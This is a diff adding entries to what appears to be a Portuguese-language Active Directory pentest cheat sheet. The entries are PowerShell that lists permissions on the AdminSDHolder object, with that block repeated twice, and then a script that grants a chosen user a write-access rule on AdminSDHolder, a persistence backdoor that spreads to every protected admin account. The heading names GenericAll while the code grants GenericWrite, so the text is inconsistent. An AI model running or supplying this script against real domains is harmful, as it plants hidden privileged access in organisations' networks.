@@ -1593,9 +1593,27 @@ Get-ADUser -LDAPFilter "(admincount=1)" | Select Name,DistinguishedName
 ```
 Get-ADGroup -LDAPFilter "(admincount=1)" | Select Name,DistinguishedName
 ```
-
-
-
+##### ADMIN SDHOLDER - LIST PERMISSIONS
+```
+(Get-ACL "AD:CN=AdminSDHolder,CN=System,DC=TECH,DC=LOCAL").access | Select IdentityReference, AccessControlType, ActiveDirectoryRights
+```
+##### ADMIN SDHOLDER - LIST PERMISSIONS
+```
+(Get-ACL "AD:CN=AdminSDHolder,CN=System,DC=TECH,DC=LOCAL").access | Select IdentityReference, AccessControlType, ActiveDirectoryRights
+```
+##### ADMIN SDHOLDER - ADICIONAR GENERICALL PARA USUARIO
+```
+$MyAdmin = (get-aduser pentester).sid
+$MyDistinguishedName = "CN=AdminSDHolder,CN=System,DC=TECH,DC=LOCAL"
+$MyDistinguishedNameAD = $MyDistinguishedName = "AD:$MyDistinguishedName"
+$MyACL= Get-ACL $MyDistinguishedNameAD
+$MyADRights = [System.DirectoryServices.ActiveDirectoryRights] "GenericWrite"
+$MyType = [System.Security.AccessControl.AccessControlType] "Allow"
+$MyInheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "All"
+$MyACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $MyAdmin,$MyADRights,$MyType,$MyInheritanceType
+$MyACL.AddAccessRule($MyACE)
+Set-acl -aclobject $MyACL $MyDistinguishedNameAD
+```
 
 
 
